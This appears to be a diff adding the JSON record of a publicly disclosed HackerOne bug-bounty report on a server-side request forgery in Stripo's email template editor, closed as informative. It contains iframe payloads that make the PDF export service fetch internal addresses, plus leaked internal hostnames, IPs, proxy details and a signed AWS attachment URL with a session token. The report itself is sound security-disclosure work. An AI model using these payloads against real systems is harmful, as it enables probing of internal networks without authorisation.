@@ -1,0 +1,266 @@
+{
+    "id": 782979,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODI5Nzk=",
+    "url": "https://hackerone.com/reports/782979",
+    "title": "Information disclosure through Server side resource forgery",
+    "state": "Closed",
+    "substate": "informative",
+    "severity_rating": "medium",
+    "readable_substate": "Informative",
+    "created_at": "2020-01-25T02:57:14.512Z",
+    "submitted_at": "2020-01-25T02:57:14.512Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "checkm50",
+        "url": "/checkm50",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 42368,
+        "url": "https://hackerone.com/stripo",
+        "handle": "stripo",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Stripo Inc",
+            "twitter_handle": "",
+            "website": "https://stripo.email",
+            "about": "Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2020-01-28T15:48:08.415Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-01-27T17:00:21.901Z",
+    "team_member_agreed_on_going_public_at": "2020-01-28T15:48:08.343Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary:\nThe application https://my.stripo.email has a template feature where can we can enter html code.\nBy including an iframe in the html template, I was able to make a call to my server.\nThis exposed an internally running web application. Please refer below,\n```63.33.82.168 - - [25/Jan/2020:01:49:33 +0000] \"GET /redirect.php HTTP/1.1\" 301 5 \"http://stripe-export-service:8080/v1/download/template/pdf/57764\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\"```\n\nNote the IP address and stripe-export-service URL.\n\nIP address is accessible internal only.\n\nI tried to iframe the IP address which I got above and exported as PDF. It had below information,\n```webmaster?subject=CacheErrorInfo - ERR_CONNECT_FAIL&body=CacheHost: proxy-eu.stripo.email\nErrPage: ERR_CONNECT_FAIL\nErr: (111) Connection refused\nTimeStamp: Sat, 25 Jan 2020 01:37:02 GMT\nClientIP: 172.31.5.123\nServerIP: 63.33.82.168\nHTTP Request:\nGET / HTTP/1.1\nProxy-Connection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\nAccept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://stripe-export-service:8080/v1/download/template/pdf/57763\nAccept-Encoding: gzip, deflate\nHost: 63.33.82.168```\n\nAbove result exposes two things.\n* Proxy host proxy-eu.stripo.email\n* and the version Squid proxy **(squid/3.5.23)**\n\nThis exposure gives more attack surface to an attacker.\n\n## Steps To Reproduce:\n1. Logon to stripo\n2. Head over to creating an email template and choose html option\n3. Use below iframe code to make a call to your server\n<iframe src='your domain'></iframe>\n4. To hit internal IP address and disclose the proxy info, use below iframe\n<iframe src='http://63.33.82.168' height=800 width=800></iframe>\n\n## Supporting Material/References:\nAttaching the PDF I exported with proxy related information\n\n## Impact\n\nExposure of internal web application URL, IP address, Proxy host and the Proxy server Squid version to the attacker gives the attacker more attack surface.",
+    "weakness": {
+        "id": 68,
+        "name": "Server-Side Request Forgery (SSRF)"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 695488,
+            "file_name": "New_email-6.pdf",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vj96HBa8opTikAbx696HedLr?response-content-disposition=attachment%3B%20filename%3D%22New_email-6.pdf%22%3B%20filename%2A%3DUTF-8%27%27New_email-6.pdf&response-content-type=application%2Fpdf&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4N3L6HVK%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072612Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEt4ffSVAwnkR7Gt9YHrh2mIYz2YHZKnL1I%2FxRODgQIJAiEAhqrstVpa8vzaI37yef%2FkTFlYpzB9%2BUB%2FeR%2FQRtP%2BH2squgUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMO5QUZmlOhJgruQOyqOBQtDUp3uDHv2jY6x0yE0OADdY1ooh28osZSuWI7OuePExEgOiw7z8uNp%2BRvZJ75q%2FJ7cG2CMMlV2SncTPeStOQTR7nCQydCl7iTiYDK8cxNqm30yTAFHrKq%2FBYstOkzo0BEUqmTqeLMAgZzUpprsA%2Bq8%2BqwyxN79JwG4OH3bUyjp7Rip33VeFRZFgv18Cc7kN3M4G4LsNYA20k1oL9QN9MI4z5%2Bkqri6Wtn1pJAw6IK9ApXr2uUB3HiRpxQxPT2jgscFdVTTtvnz6u7IHYVUtLfgzKNZdOA0FluiFpflfo217pIzGcZzI41isFU%2BABYu3ccUGmZNnCljTxmTtMxDkATbwY5BQdVVVy7s7nI1oaWL69va0fsaf5t8%2BZtCgE7IVK%2B69s4pnTYiPi9XPJzErs27S6RGtkHmkcxIj2zhTR6YpYUUWKiNelS2tCNQBIhUAJHbj2TEnuGN%2B0mFdojuGhulUnHHJ5Mo8GPgSbtK4h4VIocXITtGf%2F2Ilr%2BORY%2FJublfnM%2Bxze0THnPuQIFbySXgQ0OytUijrH%2FPIM70li%2FLiFZYOs2GOvqIAcPVICmF1tV8VaDtc4UHvfB3sHogmsLsVGEsqv%2BZhnFFkXkBPzfFL3JoSk%2FBn%2BRzVamXhI%2BUoPWuENj%2BFAJE397SYp3tyj0hiL3euwcEmSnfym3bMyfKA1KKkk%2FhSbOQ0%2FMvQzjgDjygrTh1fZnRcyFaWWlUVq89ngeMXNUQhAa4W%2BBU9cIp28iMYL5f8FY4dS1RHnh7d1E7qGa%2FuSWlfO0vW0C400gwAltilckIWBmgPNAkl6TPqRgx0MtoDdoLCSaKdB%2BpNa%2F0q5n3y7dzn8Ev8%2F8Fcd0G2xdYsOpUXeug96KhxDCHpbanBjqxAfI5U%2BnCoiaHfEl5Rs64icg5LllDgheE%2B%2BO4VpE6nN2q1YoMjNWLoeinCHZazaS9Q0XVN9QhluG25BFy172zKjBnv6faSMvFq69uXL9SlLa1tQEsjWqg3YlalreBmKsB1Yc6G5csbu5x5PpYWSwEe1%2B6b4N9LyDeM3lYe5aY4l9uDJ0Mf7bRWv8ZGhiyXIOXv3alyq8zuaz4Cqfk0ADUAChIqZIR0ylybsR8nt%2BSw3L8EQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=add4b82ad206fa06bb5e980856ea74ca242e77151f118652ee0737188c95e831",
+            "file_size": 39183,
+            "type": "application/pdf"
+        }
+    ],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 7,
+    "voters": [
+        "al-madjus",
+        "rook1337",
+        "pirateducky",
+        "exception",
+        "ladybheem",
+        "b9372d4605459ca97219795",
+        "alvaeze"
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 38702,
+        "asset_type": "URL",
+        "asset_identifier": "my.stripo.email",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 6880984,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "@checkm50  Thank you for this report - you're really adept to do this. Nevertheless, we came up with that we accept this vulnerability as acceptable and will not take this into the backlog. ",
+            "automated_response": false,
+            "created_at": "2020-01-27T15:10:20.785Z",
+            "updated_at": "2020-01-27T15:10:20.785Z",
+            "actor": {
+                "username": "artem_nefedov",
+                "cleared": false,
+                "verified": false,
+                "url": "/artem_nefedov",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6881217,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "A Low would have been nice for my points @artem_nefedov but no problem thanks :)\n",
+            "automated_response": false,
+            "created_at": "2020-01-27T15:39:38.730Z",
+            "updated_at": "2020-01-27T15:39:38.730Z",
+            "actor": {
+                "username": "checkm50",
+                "cleared": false,
+                "verified": false,
+                "url": "/checkm50",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6882223,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "If you don't mind could we please disclose :)",
+            "automated_response": false,
+            "created_at": "2020-01-27T17:00:21.919Z",
+            "updated_at": "2020-01-27T17:00:21.919Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "checkm50",
+                "cleared": false,
+                "verified": false,
+                "url": "/checkm50",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6892474,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-01-28T15:48:08.362Z",
+            "updated_at": "2020-01-28T15:48:08.362Z",
+            "actor": {
+                "username": "artem_nefedov",
+                "cleared": false,
+                "verified": false,
+                "url": "/artem_nefedov",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6892475,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-01-28T15:48:08.431Z",
+            "updated_at": "2020-01-28T15:48:08.431Z",
+            "actor": {
+                "username": "artem_nefedov",
+                "cleared": false,
+                "verified": false,
+                "url": "/artem_nefedov",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        },
+        {
+            "id": 6892513,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks @artem_nefedov  :)",
+            "automated_response": false,
+            "created_at": "2020-01-28T15:53:47.806Z",
+            "updated_at": "2020-01-28T15:53:47.806Z",
+            "actor": {
+                "username": "checkm50",
+                "cleared": false,
+                "verified": false,
+                "url": "/checkm50",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "stripo"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
